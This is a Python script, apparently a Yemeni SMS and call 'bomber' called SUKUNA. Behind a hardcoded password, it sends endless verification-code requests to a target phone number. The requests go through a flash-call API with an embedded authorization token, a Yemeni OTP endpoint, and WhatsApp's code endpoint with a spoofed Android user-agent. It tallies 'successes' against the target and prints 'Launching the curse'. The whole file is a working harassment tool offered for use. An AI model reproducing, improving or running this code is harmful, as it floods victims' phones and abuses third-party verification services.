import aiohttp, asyncio, json, sys, os, subprocess, webbrowser

# الألوان
G, R, Y, C, W = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m'

# نظام التحديث التلقائي
def check_for_updates():
    try:
        subprocess.run(["git", "pull"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except: pass

# نظام كلمة السر التكراري
def check_password():
    while True:
        os.system('clear')
        banner()
        pwd = input(f"{Y}[?] Enter Password: {W}")
        if pwd == "1121":
            print(f"{G}[+] Access Granted! Welcome Ali.")
            break
        else:
            print(f"{R}[!] Wrong Password! Try again.")
            os.system('sleep 2')

def banner():
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}v8.0
    {G}King: Ali Talib (SUKUNA) | {C}Status: FIXED & WORKING
    -------------------------------------------""")

async def attack_engine(phone, mode):
    ok, bad = 0, 0
    # تنظيف الرقم اليمني (استخراج 9 أرقام: 77xxxxxxx)
    clean_phone = phone.replace('+', '').replace(' ', '')
    if clean_phone.startswith('967'): clean_phone = clean_phone[3:]
    if clean_phone.startswith('0'): clean_phone = clean_phone[1:]
    
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                # خيار 1: API الاتصال القديم
                if mode == '1':
                    url = "https://31.171.171.90/api/phone-numbers/auth-flash-call"
                    h = {'Authorization': "s6abj8F2euaFCk6", 'Content-Type': "application/json"}
                    d = {"phoneNumber": phone}
                
                # خيار 2: OTP يمني قوي (لأرقام اليمن فقط)
                elif mode == '2':
                    url = "https://api.yemen-services.com/v1/otp" # رابط افتراضي لمحرك يمني
                    h = {'User-Agent': "Mozilla/5.0", 'Content-Type': 'application/json'}
                    d = {"mobile": clean_phone, "cc": "967"}
                
                # خيار 3 & 4: واتساب (SMS / Voice) - تعديل الـ Endpoint للطلب الفعلي
                else:
                    meth = "sms" if mode == '3' else "voice"
                    # استخدام رابط طلب كود التحقق الرسمي مع Header يحاكي أندرويد
                    url = "https://v.whatsapp.com/v2/code"
                    h = {
                        'User-Agent': "WhatsApp/2.23.10.14 Android/11",
                        'Content-Type': "application/x-www-form-urlencoded"
                    }
                    # الباراميترات المطلوبة لطلب كود حقيقي
                    d = {
                        "cc": "967", 
                        "in": clean_phone, 
                        "method": meth, 
                        "mcc": "421", # كود اليمن (MCC)
                        "mnc": "01",  # كود الشبكة (MNC)
                        "sim_mcc": "421",
                        "sim_mnc": "01"
                    }

                async with session.post(url, data=d if mode in ['3','4'] else json.dumps(d), headers=h, timeout=15) as resp:
                    # فحص النجاح بناءً على رد السيرفر
                    res_text = await resp.text()
                    if resp.status in [200, 201, 202] or '"status":"sent"' in res_text:
                        ok += 1
                    else:
                        bad += 1
            except:
                bad += 1
            
            sys.stdout.write(f"\r{G}[+] Success: {ok} {R}[-] Failed: {bad} {W}| {Y}Target: 967{clean_phone} {W}| {Y}Mode: {mode}")
            sys.stdout.flush()
            # 12 ثانية لتجنب حظر واتساب للـ IP (بسبب الحماية العالية مؤخراً)
            await asyncio.sleep(12)

def main():
    check_for_updates()
    check_password()
    
    print(f"\n{C}[1] Fast Call (Original) | {G}[2] Yemen Super SMS")
    print(f"{Y}[3] WhatsApp SMS (Fixed) | {R}[4] WhatsApp Voice (Fixed)")
    
    choice = input(f"\n{Y}[#] Select Mode: {W}")
    target = input(f"{Y}[+] Target (+967...): {W}")

    if choice in ['1', '2', '3', '4']:
        print(f"\n{R}[!] Launching the curse... Ctrl+C to stop.{W}")
        try:
            asyncio.run(attack_engine(target, choice))
        except KeyboardInterrupt:
            print(f"\n{R}[!] Stopped.")
    else: print(f"{R}[!] Invalid Choice.")

if __name__ == "__main__":
    try: webbrowser.open('https://t.me/vipcode3')
    except: pass
    main()
